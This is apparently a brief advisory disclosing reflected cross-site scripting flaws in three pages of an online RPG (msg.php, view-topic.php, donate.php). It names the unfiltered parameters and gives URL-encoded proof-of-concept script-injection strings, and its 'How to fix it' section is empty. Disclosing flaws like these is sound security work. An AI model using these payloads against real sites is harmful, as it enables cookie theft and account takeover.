  XSS
  ----!?

On this online RPG, it's possible for a malicious user
use XSS (Cross Site Scripting) attacks to steal users cookies
and possibly their account.

The files affected by this are:

msg.php, unfiltred var=nick
view-topic.php, unfiltred var=page
donate.php, unfiltred var=nation

Attack example here:

msg.php?nick=ValidUser%22%3E%3Cscript%3Ealert(/xss/)%3C/script%3E
forums/view-topic.php?id=3830&page=2%22%3E%3Cscript%3Ealert(/xss/)%3C/script%3E
donate.php?nation=PT%22%3E%3Cscript%3Ealert(/xss/)%3C/script%3E

  How to fix it
